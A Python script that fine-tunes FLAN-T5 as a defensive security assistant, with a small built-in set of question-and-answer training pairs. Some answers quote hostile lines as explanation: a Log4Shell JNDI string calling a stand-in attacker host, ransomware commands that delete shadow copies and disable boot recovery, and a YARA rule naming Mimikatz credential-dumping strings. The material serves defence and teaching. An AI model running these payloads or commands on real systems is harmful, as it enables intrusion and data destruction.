#!/usr/bin/env python3
"""
Fine-tune FLAN-T5 LLM for Cyber Guru Cybersecurity Assistant
Run: python ml_models/scripts/train_guru_llm.py
"""

import os
import sys
import torch
from torch.utils.data import Dataset, DataLoader
from torch.optim import AdamW
from transformers import AutoTokenizer, AutoModelForSeq2SeqLM, get_linear_schedule_with_warmup

# Ensure project root is in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

MODEL_NAME = "google/flan-t5-small"
OUTPUT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "saved_models", "cyber_guru_llm"))

# Specialized Cybersecurity Fine-Tuning Instruction Dataset
CYBER_INSTRUCTION_DATASET = [
    {
        "prompt": "How do I detonate a file in CrimeCast?",
        "response": "To detonate a file in CrimeCast, navigate to the Sandbox Portal (/sandbox), drag and drop your sample (.exe, .py, .pdf, .zip), select your execution environment (Docker or Firejail), and click 'Start Detonation Analysis'. You can view real-time behavioral telemetry, threat scores, and export intelligence reports."
    },
    {
        "prompt": "What can CrimeCast do?",
        "response": "CrimeCast provides real-time multi-engine malware detonation, dynamic behavioral telemetry extraction, ML ensemble threat scoring, cryptographic blockchain evidence anchoring, SIEM integration, and interactive incident triage with Cyber Guru AI."
    },
    {
        "prompt": "Explain CVE-2024-3094 xz utils backdoor.",
        "response": "CVE-2024-3094 is a critical supply chain backdoor in xz-utils versions 5.6.0 and 5.6.1. The malicious code intercepts RSA authentication in OpenSSH (sshd via systemd/liblzma), allowing unauthorized Remote Code Execution (RCE). Remediation: Immediately downgrade xz-utils to version 5.4.x or update to vendor patches."
    },
    {
        "prompt": "Explain Log4Shell CVE-2021-44228 vulnerability.",
        "response": "Log4Shell (CVE-2021-44228) is a CVSS 10.0 critical RCE vulnerability in Apache Log4j2. Attackers send JNDI lookup strings like `${jndi:ldap://attacker.com/a}` inside HTTP headers or user input, prompting Log4j to execute remote Java byte code. Patch: Upgrade Log4j to version 2.17.1 or higher."
    },
    {
        "prompt": "How to prevent SQL injection in Python database queries?",
        "response": "To prevent SQL injection in Python, use parameterized queries instead of string concatenation. Example: `cursor.execute('SELECT * FROM users WHERE username = %s', (user_input,))`. Never use string format or f-strings for raw SQL parameters."
    },
    {
        "prompt": "How to fix Cross-Site Scripting (XSS) in React web applications?",
        "response": "React automatically escapes rendered variables inside JSX text nodes to prevent XSS. Avoid using `dangerouslySetInnerHTML`. If HTML rendering is required, sanitize input using DOMPurify before injecting."
    },
    {
        "prompt": "Write a YARA rule to detect Mimikatz LSASS dumping.",
        "response": "rule Detect_Mimikatz_LSASS {\n    meta:\n        description = \"Detects Mimikatz memory credential dumping\"\n        severity = \"HIGH\"\n    strings:\n        $m1 = \"lsadump::sam\" ascii nocase\n        $m2 = \"sekurlsa::logonpasswords\" ascii nocase\n        $m3 = \"mimikatz.exe\" ascii nocase\n    condition:\n        any of ($m1, $m2, $m3)\n}"
    },
    {
        "prompt": "Explain MITRE ATT&CK technique T1059 Command and Scripting Interpreter.",
        "response": "MITRE ATT&CK T1059 covers adversary usage of command interpreters (PowerShell, cmd.exe, bash, python) to execute arbitrary commands, scripts, or binaries. Detection: Audit Sysmon Event ID 1 process creation and monitor parent-child process anomalies."
    },
    {
        "prompt": "What is MITRE ATT&CK technique T1003 Credential Dumping?",
        "response": "T1003 involves adversaries extracting credentials (hashes or plaintext passwords) from system memory, registry hives (SAM/LSASS), or domain controllers (NTDS.dit). Mitigation: Enable LSA Protection (RunAsPPL) and restrict Administrator privileges."
    },
    {
        "prompt": "How to isolate a compromised endpoint host during incident response?",
        "response": "To isolate a compromised host: 1) Sever network connections (disable NIC or switch port) without powering off the machine to preserve volatile RAM. 2) Capture a memory dump using winpmem or Volatility. 3) Triage event logs ($MFT, Prefetch, Shimcache) offline."
    },
    {
        "prompt": "What are Docker container security best practices?",
        "response": "Docker security best practices: 1) Run containers with non-root user (`USER 10001`). 2) Use read-only root filesystems (`--read-only`). 3) Drop Linux capabilities (`--cap-drop=ALL`). 4) Isolate network access for dynamic analysis (`--network none`)."
    },
    {
        "prompt": "Explain AES-256-GCM encryption standard.",
        "response": "AES-256-GCM is an Authenticated Encryption with Associated Data (AEAD) cipher operating on 128-bit blocks with 256-bit key length. It provides both data confidentiality and cryptographic authenticity verification."
    },
    {
        "prompt": "How to analyze email authentication headers for phishing?",
        "response": "Inspect email headers for: 1) SPF (Sender Policy Framework) pass/fail alignment. 2) DKIM (DomainKeys Identified Mail) cryptographic signature verification. 3) DMARC policy enforcement (p=reject or quarantine)."
    },
    {
        "prompt": "How to set up API keys and authentication in CrimeCast?",
        "response": "API keys can be generated under Profile & Admin Settings (/admin/api-keys). Use the JWT Access Token in HTTP Authorization headers: `Authorization: Bearer <your_jwt_token>` for authenticated REST API calls."
    },
    {
        "prompt": "What is ransomware shadow copy deletion?",
        "response": "Ransomware frequently executes `vssadmin.exe delete shadows /all /quiet` and `bcdedit /set {default} bootstatuspolicy ignoreallfailures` to destroy Windows Volume Shadow Copies and disable startup recovery before encrypting files."
    }
]


class CyberDataset(Dataset):
    def __init__(self, data, tokenizer, max_prompt_len=128, max_resp_len=256):
        self.data = data
        self.tokenizer = tokenizer
        self.max_prompt_len = max_prompt_len
        self.max_resp_len = max_resp_len

    def __len__(self):
        return len(self.data)

    def __getitem__(self, idx):
        item = self.data[idx]
        prompt_text = f"CyberGuru Assistant Task: {item['prompt']}"
        resp_text = item['response']

        inputs = self.tokenizer(
            prompt_text,
            max_length=self.max_prompt_len,
            padding="max_length",
            truncation=True,
            return_tensors="pt"
        )
        labels = self.tokenizer(
            resp_text,
            max_length=self.max_resp_len,
            padding="max_length",
            truncation=True,
            return_tensors="pt"
        )

        labels_ids = labels["input_ids"].squeeze(0)
        labels_ids[labels_ids == self.tokenizer.pad_token_id] = -100

        return {
            "input_ids": inputs["input_ids"].squeeze(0),
            "attention_mask": inputs["attention_mask"].squeeze(0),
            "labels": labels_ids
        }


def train_cyber_llm():
    print("=" * 65)
    print("  Fine-Tuning FLAN-T5 LLM Neural Network for Cyber Guru AI")
    print("=" * 65)

    print(f"[+] Base Model: {MODEL_NAME}")
    tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
    model = AutoModelForSeq2SeqLM.from_pretrained(MODEL_NAME)

    dataset = CyberDataset(CYBER_INSTRUCTION_DATASET, tokenizer)
    dataloader = DataLoader(dataset, batch_size=4, shuffle=True)

    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    print(f"[+] Training Device: {device}")
    model.to(device)

    optimizer = AdamW(model.parameters(), lr=3e-4)
    epochs = 15
    total_steps = len(dataloader) * epochs
    scheduler = get_linear_schedule_with_warmup(optimizer, num_warmup_steps=5, num_training_steps=total_steps)

    model.train()
    print(f"[+] Starting training for {epochs} epochs across {len(CYBER_INSTRUCTION_DATASET)} instruction samples...")

    for epoch in range(1, epochs + 1):
        epoch_loss = 0.0
        for batch in dataloader:
            optimizer.zero_grad()
            input_ids = batch["input_ids"].to(device)
            attention_mask = batch["attention_mask"].to(device)
            labels = batch["labels"].to(device)

            outputs = model(input_ids=input_ids, attention_mask=attention_mask, labels=labels)
            loss = outputs.loss
            loss.backward()
            optimizer.step()
            scheduler.step()

            epoch_loss += loss.item()

        avg_loss = epoch_loss / len(dataloader)
        if epoch % 3 == 0 or epoch == epochs:
            print(f"    Epoch {epoch:02d}/{epochs:02d} - Training Loss: {avg_loss:.4f}")

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    model.save_pretrained(OUTPUT_DIR)
    tokenizer.save_pretrained(OUTPUT_DIR)
    print(f"\n[✓] Cyber Guru FLAN-T5 LLM successfully saved to:\n    {OUTPUT_DIR}")
    print("=" * 65)


if __name__ == "__main__":
    train_cyber_llm()
